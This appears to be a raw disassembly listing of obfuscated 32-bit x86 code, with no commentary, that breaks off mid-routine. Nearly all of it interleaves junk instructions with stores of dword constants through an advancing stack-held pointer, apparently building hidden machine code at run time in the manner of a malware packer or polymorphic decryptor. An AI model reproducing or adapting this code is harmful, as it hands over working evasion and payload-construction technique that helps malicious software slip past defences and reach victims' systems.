		add	[esp+var_64], ecx
		or	di, bx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 2E0C1CDh
		add	bx, cx
		lea	edi, byte_40FB79[esi]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	edi, byte_40FB79[esi]
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 9C244C8Bh
		mov	bx, di
		and	bp, si
		mul	ebp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	bp, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 74290181h
		mul	ebp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	ebp, ecx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 3181D7C0h
		movzx	ecx, dh
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	bp, bp
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 69977429h
		sub	eax, ecx
		movzx	ebx, ah
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movzx	ebx, ah
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 3302E0C1h
		movsx	edx, cl
		xadd	eax, ecx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xadd	eax, ecx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 104B3DBh
		add	cx, dx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	edx, edi
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 8D9C245Ch
		mov	dx, bx
		mov	ebx, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	ebx, ebx
		sub	di, dx
		mov	edi, [esp+var_64]
		mov	eax, 548B025Dh
		stosd
		sub	di, dx
		imul	ecx
		lea	esi, byte_40D9EF[ebx]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		imul	ecx
		lea	esi, byte_40D9EF[ebx]
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 2819C24h
		lea	esi, byte_40D9EF[ebx]
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	cx, bp
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 9D89BEAAh
		mov	ecx, ebx
		mov	ebp, edi
		rcl	ebp, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	ebp, edi
		rcl	ebp, 2
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 0AEAA3281h
		rcl	ebp, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	bp, si
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 0C1839DC9h
		imul	ecx
		movsx	ecx, bl
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movsx	ecx, bl
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0D7B60F02h
		sbb	ecx, offset word_40DC6A
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	ebp, edx
		add	ecx, ecx
		and	ax, cx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4B1C933h
		add	ecx, ecx
		and	ax, cx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ax, cx
		and	di, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 9C244C01h
		and	di, bx
		or	bx, bx
		xor	ecx, ebp
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	bx, bx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 8BD7B60Fh
		xor	ecx, ebp
		mov	edx, ecx
		mov	ax, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	edx, ecx
		mov	ax, dx
		mov	edi, [esp+var_64]
		mov	eax, 819C2454h
		stosd
		mov	ax, dx
		mov	bp, dx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	bp, dx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0BF02E02h
		shld	eax, ecx, 3
		test	si, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	si, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0C6328106h
		add	edi, esi
		mov	si, bp
		xor	ebx, ebp
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	si, bp
		xor	ebx, ebp
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 66060BE5h
		xor	ebx, ebp
		or	ecx, esi
		and	ebx, esi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		or	ecx, esi
		and	ebx, esi
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0DB33D58Bh
		and	ebx, esi
		xor	eax, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	eax, ebx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 5C0104B3h
		add	ecx, esi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	edx, ebx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 33669C24h
		sub	dx, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	edi, eax
		and	edi, edi
		mov	ax, cx
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0D92B66C5h
		and	edi, edi
		mov	ax, cx
		lea	edx, [ecx+2]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	ax, cx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 9C24448Bh
		lea	edx, [ecx+2]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	cx, si
		add	cx, cx
		mov	edi, [esp+var_64]
		mov	eax, 0E3440081h
		stosd
		add	cx, cx
		mov	di, ax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	di, ax
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 3081A2B5h
		mov	ecx, edi
		xor	ecx, ebp
		sub	dx, bp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	ecx, ebp
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0F2B55C44h
		sub	dx, bp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	di, dx
		test	edx, edi
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 33D92B66h
		test	edx, edi
		mov	eax, ebx
		or	bx, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	eax, ebx
		or	bx, di
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 104B1C9h
		or	bx, di
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	ecx, ebp
		lea	ecx, [ebx+2]
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 0F9C244Ch
		lea	ecx, [ebx+2]
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	bx, si
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 5C8BD7BEh
		sbb	eax, offset byte_40FBFF
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	si, dx
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 3819C24h
		and	edx, eax
		sar	eax, 2
		sub	esi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sar	eax, 2
		mov	edi, [esp+var_64]
		mov	eax, 7810B256h
		stosd
		sub	esi, 2
		and	dx, di
		test	dx, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	dx, di
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0B2173381h
		test	dx, dx
		movsx	ecx, bl
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movsx	ecx, bl
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 236678ABh
		lea	ebx, [esi+2]
		rcl	ebp, 2
		and	cx, di
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		rcl	ebp, 2
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0B3DB33F2h
		and	cx, di
		add	ecx, ebp
		shl	ecx, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	ecx, ebp
		shl	ecx, 2
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 245C0104h
		shl	ecx, 2
		movzx	ecx, bh
		xor	ebx, edi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		movzx	ecx, bh
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0F203669Ch
		xor	ebx, edi
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sbb	ebx, offset byte_40F86D
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 9C24448Bh
		and	edx, ebx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	ax, bp
		movzx	eax, bl
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0ED340081h
		movzx	eax, bl
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movzx	eax, ah
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 308141DEh
		add	edi, 2
		or	edx, edi
		mov	bp, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	edx, edi
		mov	bp, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0FFDEED9Ch
		mov	bp, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sbb	esi, 2
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 33DDBE0Fh
		xor	ebp, esi
		xor	ebp, offset byte_40D879
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	ebp, offset byte_40D879
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 104B2D2h
		rcl	ebx, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	cx, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0C19C2454h
		xor	cx, ax
		mov	edx, eax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	edx, eax
		test	si, di
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4C8B02E3h
		test	si, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ebx, edx
		xor	edx, edi
		add	edi, ebx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 1819C24h
		xor	edx, edi
		add	edi, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	edi, ebx
		or	dx, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0CF275401h
		or	dx, bx
		mov	ebx, offset byte_40DFFF
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	ebx, offset byte_40DFFF
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 44013181h
		or	edx, ebp
		movzx	edx, cl
		add	ebx, 2
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		movzx	edx, cl
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 8566CF67h
		add	ebx, 2
		or	si, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	si, di
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0D0C10FF9h
		xor	edi, offset byte_40D869
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	ecx, ebx
		test	eax, esi
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4B3DB33h
		test	eax, esi
		or	si, bp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	si, bp
		add	esi, ebx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 9C245C01h
		add	esi, ebx
		sub	ecx, ecx
		sub	ecx, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	ecx, ecx
		mov	edi, [esp+var_64]
		mov	eax, 8BD0C10Fh
		stosd
		sub	ecx, 2
		lea	esi, dword_40FCF8[eax]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		lea	esi, dword_40FCF8[eax]
		mov	edi, [esp+var_64]
		mov	eax, 819C2454h
		stosd
		and	bp, cx
		test	esi, ebp
		test	ebx, esi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	esi, ebp
		test	ebx, esi
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 1E802h
		test	ebx, esi
		xor	di, dx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	di, dx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0D8AC0F00h
		or	cx, dx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sar	ebx, 2
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 2BD28B03h
		movzx	eax, ch
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	edi, edx
		xor	si, ax
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0B0C033C8h
		xor	si, ax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		add	esi, edx
		sub	dx, bp
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 24440104h
		sub	dx, bp
		sub	ax, ax
		add	ax, ax
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	ax, ax
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 8BD28B9Ch
		add	ax, ax
		sub	di, bx
		xor	eax, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	di, bx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 819C244Ch
		xor	eax, ebx
		movzx	edx, dl
		sub	ebp, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movzx	edx, dl
		sub	ebp, ebx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 568A2D01h
		sub	ebp, ebx
		xor	bp, si
		add	dx, bp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		xor	bp, si
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 2D31814Dh
		add	dx, bp
		add	si, di
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	si, di
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 2BF03649h
		movsx	ecx, cl
		and	bp, dx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	bp, dx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 0B2D233C8h
		lea	ebp, [eax+2]
		sub	ebp, ebp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	ebp, ebp
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 24540104h
		lea	edx, dword_40FAFC[eax]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		neg	edx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0CAB60F9Ch
		add	si, si
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	di, di
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 9C24548Bh
		or	cx, bx
		imul	ecx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		imul	ecx
		or	dx, di
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0A4660281h
		or	dx, di
		movsx	ebx, cl
		sub	ebp, ecx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		movsx	ebx, cl
		sub	ebp, ecx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 3281082Ah
		sub	ebp, ecx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	edi, edx
		mov	edi, [esp+var_64]
		mov	eax, 82AA462h
		stosd
		movsx	ecx, cl
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	edi, edi
		sub	eax, ebx
		or	eax, edx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0D233EA23h
		sub	eax, ebx
		or	eax, edx
		imul	ebx
		and	di, dx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	eax, edx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 540104B2h
		imul	ebx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	di, dx
		mov	edi, [esp+var_64]
		mov	eax, 6BBA9C24h
		stosd
		movsx	ebx, cl
		or	edi, edi
		neg	ebx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	edi, edi
		neg	ebx
		add	edi, ebx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 8B0040D9h
		neg	ebx
		add	edi, ebx
		xor	ebp, ecx
		test	esi, offset byte_40DA7F
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	edi, ebx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 819C2454h
		xor	ebp, ecx
		test	esi, offset byte_40DA7F
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	esi, offset byte_40DA7F
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0F3DFC702h
		add	bp, si
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	dx, si
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 7E3281BDh
		and	ebx, ebx
		or	cx, ax
		xor	bx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	cx, ax
		mov	edi, [esp+var_64]
		mov	eax, 81B3F3DFh
		stosd
		xor	bx, bx
		rcl	esi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		rcl	esi, 2
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 40DB6CD8h
		movsx	ebx, dl
		xor	cx, cx
		or	ax, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	cx, cx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 0B3DB3300h
		or	ax, bx
		lea	edi, byte_40FAEC[edx]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	edi, byte_40FAEC[edx]
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 245C0104h
		test	esi, ecx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	edi, offset byte_40DAE9
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0D78B669Ch
		xor	cx, cx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	di, si
		or	si, dx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 9C245C8Bh
		or	si, dx
		sub	cx, ax
		or	ecx, ebx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	cx, ax
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0E54B0381h
		or	ecx, ebx
		movzx	edx, bl
		add	ebx, eax
		mov	ax, di
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movzx	edx, bl
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 3381D770h
		add	ebx, eax
		mov	ax, di
		add	eax, eax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	ax, di
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0F334684Bh
		add	eax, eax
		test	eax, ebx
		add	edi, 2
		or	edi, edx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	eax, ebx
		add	edi, 2
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 2366CF8Bh
		add	edi, 2
		or	edi, edx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	edi, edx
		or	bx, bp
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 0CA8566C5h
		or	bx, bp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	eax, edi
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 4B0C033h
		add	ebp, edx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		not	eax
		and	cx, si
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 9C244401h
		and	cx, si
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	si, ax
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 8BC52366h
		xadd	eax, eax
		xor	bx, bx
		rcl	edi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	bx, bx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 819C2454h
		rcl	edi, 2
		sub	dx, dx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	dx, dx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0BA2802h
		xor	si, si
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	ebp, ecx
		rol	ebp, 2
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0CA856610h
		rol	ebp, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	di, cx
		mov	edi, [esp+var_64]
		mov	eax, 3C8C10Fh
		stosd
		add	edi, edx
		and	edi, ebx
		sub	esi, esi
		sbb	edx, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	edi, ebx
		sub	esi, esi
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 0B3DB33E9h
		sub	esi, esi
		sbb	edx, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sbb	edx, 2
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 245C0104h
		shl	ebx, 2
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	edi, eax
		test	di, ax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 0C8C10F9Ch
		test	di, ax
		mov	eax, ecx
		mov	ecx, edi
		movsx	edx, ah
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	eax, ecx
		mov	ecx, edi
		movsx	edx, ah
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 5C8BE903h
		mov	ecx, edi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movsx	edx, ah
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 3819C24h
		and	eax, esi
		test	si, di
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	si, di
		movsx	eax, dl
		mov	edi, [esp+var_64]
		mov	eax, 0CA2B0000h
		stosd
		movsx	eax, dl
		movzx	ecx, bh
		shr	esi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		movzx	ecx, bh
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0DB33E903h
		shr	esi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	di, dx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 5C0104B3h
		test	si, bp
		mov	cx, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	cx, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0C0F79C24h
		movsx	ecx, bh
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sar	edi, 2
		rcl	ebp, 2
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], offset	byte_40D9F9
		rcl	ebp, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	ebx, eax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 9C24548Bh
		sub	ebx, offset byte_40DB7B
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	edx, esi
		lea	edi, [ebx+2]
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0C22B0281h
		lea	edi, [ebx+2]
		sub	esi, 2
		sub	esi, eax
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	esi, 2
		sub	esi, eax
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0FA8B0885h
		sub	esi, eax
		lea	esi, [esi+2]
		test	cx, si
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	esi, [esi+2]
		test	cx, si
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 66EE3366h
		test	cx, si
		xor	ebx, esi
		or	ecx, edi
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	ebx, esi
		or	ecx, edi
		lea	edx, [ecx+2]
		mov	edi, [esp+var_64]
		mov	eax, 0C933CA85h
		stosd
		or	ecx, edi
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		lea	edx, [ecx+2]
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4C0104B1h
		lea	edi, [ebx+2]
		sbb	edx, offset byte_40DBE9
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sbb	edx, offset byte_40DBE9
		mov	edi, [esp+var_64]
		mov	eax, 33669C24h
		stosd
		sub	dx, bp
		lea	edx, byte_40F86F[ebx]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		lea	edx, byte_40F86F[ebx]
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 244C8BEEh
		test	bx, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ecx, offset byte_40F97F
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 3B01819Ch
		sub	ebx, eax
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	eax, ecx
		xor	ecx, edx
		add	ecx, eax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 66F673CAh
		xor	ecx, edx
		add	ecx, eax
		or	bp, si
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	ecx, eax
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 0FD0BCA85h
		or	bp, si
		or	bp, bx
		lea	eax, byte_40DE78[eax]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	bp, bx
		lea	eax, byte_40DE78[eax]
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 4B3DB33h
		lea	eax, byte_40DE78[eax]
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		xadd	eax, ecx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 9C245C01h
		mov	dx, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	dx, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C581FD0Bh
		shrd	eax, ebx, 3
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	cx, bp
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], offset	byte_40F96B
		sub	edi, 2
		and	di, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	di, di
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 9C244C8Bh
		mov	bx, si
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	esi, ebp
		or	ebp, eax
		and	ebp, esi
		mov	edi, [esp+var_64]
		mov	eax, 73560181h
		stosd
		or	ebp, eax
		and	ebp, esi
		add	cx, bp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	ebp, esi
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 3181E7B4h
		add	cx, bp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	ecx, eax
		and	di, cx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 5CE72301h
		and	di, cx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movsx	edx, ah
		mov	edi, ebp
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0F96BC581h
		mov	edi, ebp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		test	bp, bx
		lea	esi, dword_40DF7C[edi]
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 0DB330040h
		lea	esi, dword_40DF7C[edi]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	dx, di
		sub	cx, di
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 5C0104B3h
		sub	cx, di
		add	si, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	si, di
		and	ebx, eax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0E8F79C24h
		and	ebx, eax
		test	edx, edx
		xchg	eax, ebp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	edx, edx
		xchg	eax, ebp
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 9C24448Bh
		xchg	eax, ebp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		not	ebp
		sub	dx, bx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 8F500081h
		sub	dx, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	cx, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 308122AAh
		lea	edx, [ebp+2]
		and	esi, esi
		or	ax, si
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	esi, esi
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 22AA8E50h
		or	ax, si
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	ebp, offset byte_40F9E8
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 8DC98566h
		lea	ebx, [edx+2]
		sub	ax, ax
